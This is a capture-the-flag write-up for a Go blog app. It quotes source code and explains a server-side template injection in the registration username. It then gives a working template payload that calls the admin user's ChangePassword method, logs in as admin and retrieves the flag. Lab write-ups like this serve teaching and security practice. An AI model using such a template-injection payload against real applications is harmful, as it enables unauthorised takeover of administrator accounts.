# My sky blog

### Information
- http://REDACTED
- src/ (source code in go)


```go
var randomSentences = []string{
	"Hey, %s; there are %d posts right now !",
	"What's up %s ? We're at %d ! Aiming for the stars !",
	"Want a coffee %s ? Ofc there's %d posts in here !",
	"Hello there, General %s, have you seen ? There's %d posts !",
}
```

This portion is vunerable to SSTI (Server Side Tempalte Injectoin)
Cette portion est vulnerable au SSTI (Server Side Tempalte Injectoin)

When we create a new user, there is no validation
```go
func register(c echo.Context) error {
	s := c.Get("session").(*Session)

	templatePath := "templates/register.html"
	tpl := template.Must(template.ParseFiles(templatePath))

	if c.Request().Method == "POST" {
		username := c.FormValue("username")
		password := c.FormValue("password")

		user := &User{
			Username: username,
		}

		user.ChangePassword(password)

		for _, u := range s.users {
			if u.Username == user.Username {
				s.HasError = true
				s.Error = "Username already taken"
				return tpl.Execute(c.Response().Writer, s)
			}
		}

		s.users = append(s.users, user)

		logrus.Infof("Registered user %s on sessions %s", user.Username, s.id)

		return c.Redirect(302, "/login")
	} else {
		return tpl.Execute(c.Response().Writer, s)
	}
}
```

The URI `/flag` contain our flag

```go
func flag(c echo.Context) error {
	s := c.Get("session").(*Session)

	if s.User == nil {
		return c.Redirect(http.StatusFound, "/login")
	}

	if !s.User.isAdmin {
		return c.String(http.StatusForbidden, "You are not an admin")
	}

	def := "4T${...}"
	flag := os.Getenv("FLAG")
	if flag != "" {
		def = flag
	}

	return c.String(http.StatusOK, def)
}
```

We must be `admin` to access it

One last thing
```go
func CreateEmptySession() *Session {
	admin := &User{
		isAdmin:  true,
		Username: "admin",
	}

	// Get a random password
	randomPassword := uuid.New().String()

	admin.ChangePassword(randomPassword)

	id := uuid.New().String()

	return &Session{
		users: []*User{
			admin,
		},
		id: id,

		User: nil,
		Posts: []*Post{
			{
				Author:    admin,
				Title:     "Welcome to my beautiful Sky Blog!",
				Body:      "I welcome you to my blog, where I'll post about my adventures in the sky !",
				UpdatedAt: time.Date(2024, 5, 1, 12, 54, 30, 20, time.UTC),
			},
		},
		NbPosts: 1,
	}
}
```
There is always 1 post as `admin`

If we follow the `struct`

```go
type Post struct {
	Author *User # <------ This is public !!!
	Title  string
	Body   string

	UpdatedAt time.Time
}

type User struct {
	isAdmin  bool # <--------- private :(
	Username string
	Password string
}
```

But we can call the ChangePassword method!
``` go
func (u *User) ChangePassword(password string) bool {
	logrus.Infof("Changing password for user %s", u.Username)

	h := sha256.New()
	h.Write([]byte(password))

	u.Password = hex.EncodeToString(h.Sum(nil))

	return true
}
```


Testing for SSTI by creating a new user: `{{.}}` 

It work! So lets try to change the password of admin `{{range .Posts}}{{.Author.ChangePassword "platypusJovial"}}{{end}}`

Once I logged in as that user, the password of admin should change:
- logout
- login with admin:platypusJovial


```4T${w417_H0w_d1D_Y0u_d0_7h12}```